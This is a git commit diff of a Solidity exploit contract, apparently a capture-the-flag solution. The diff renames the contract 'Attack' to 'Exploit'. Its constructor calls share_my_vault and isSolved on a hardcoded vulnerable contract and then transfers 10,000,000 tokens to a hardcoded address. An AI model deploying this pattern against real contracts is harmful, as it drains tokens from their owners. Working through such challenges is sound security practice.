d4d9c7999a31cfa160dc1b7238566deb204ccb9a
zjlust <49744465+zjlust@users.noreply.github.com>
2023-04-10 21:34:07 +0800

    Update Attack.sol

--- Attack.sol
+++ Attack.sol
@@ -6,12 +6,12 @@ interface Existing {
     function transfer(address to,uint amount) external;
 }
 
-contract Attack{
+contract Exploit {
 
     constructor() public {
-        Existing tar = Existing(0x68E060d5BF88236678D93B7326869a9A032F72fb); //Vulnerability contract address
-        tar.share_my_vault();
-        tar.isSolved();
-        tar.transfer(0x563940a71bBc0be6C17e4c7D9bf437F1EDa43166,10000000);
+        Existing exist = Existing(0x68E060d5BF88236678D93B7326869a9A032F72fb); //Vulnerability contract address
+        exist.share_my_vault();
+        exist.isSolved();
+        exist.transfer(0x563940a71bBc0be6C17e4c7D9bf437F1EDa43166,10000000);
     }
 }
